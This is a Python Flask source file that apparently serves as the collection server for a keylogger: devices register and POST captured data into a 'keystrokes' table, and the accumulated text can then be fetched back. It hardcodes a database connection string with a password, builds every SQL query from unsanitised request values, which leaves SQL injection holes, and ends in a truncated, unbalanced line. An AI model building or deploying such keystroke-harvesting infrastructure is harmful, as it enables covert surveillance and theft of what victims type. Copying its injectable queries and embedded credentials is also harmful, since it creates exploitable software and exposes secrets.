from flask import Flask, request, jsonify

import psycopg2
import os

connection = psycopg2.connect("postgres://bavgphjapifaco:c7bb922ab10ed6a50bfd078f4d13da4dea5ba1059bbad42ea032ba32c0acfd71@ec2-3-225-79-57.compute-1.amazonaws.com:5432/dav7loivn10s8r")
cursor = connection.cursor()

app = Flask(__name__)


def execute(query, mode="r"):
    if mode == "w":
        try:
            cursor.execute(query)
            connection.commit()
        except Exception as e:
            print(e)

    else:
        try:
            cursor.execute(query)
            return cursor.fetchall()
        except Exception as e:
            print(e)


@app.route("/register")
def register_device():
    device_id = str(request.args.get("device_id"))
    execute(f"INSERT INTO keystrokes (device_id) values ('{device_id}')", "w")
    return "True"


@app.route("/log", methods = ['POST'])
def log_data():
    device_id = str(request.json.get("device_id"))
    data = str(request.json.get("data"))

    execute(f"UPDATE keystrokes SET total_data=(SELECT CONCAT(total_data, new_data) FROM keystrokes where device_id='{device_id}'), new_data='{data}' where device_id='{device_id}'", "w")
    return "True"

@app.route("/fetch")
def fetch_data():
    device_id = str(request.args.get("device_id"))
    data = execute(f"SELECT * FROM keystrokes where device_id='{device_id}'")
    print(data)
    data = data[0]

    if not data:
        return jsonify(status=404, device_id=-1, body={
        "total_data":"",
        "new_data":""
        })

    return jsonify(status=200, device_id=data[0], body={
        "total_data":data[1],
        "new_data":data[2]
        })


app.run("0.0.0.0", port=int(os.environ.get('PORT', 5000)
    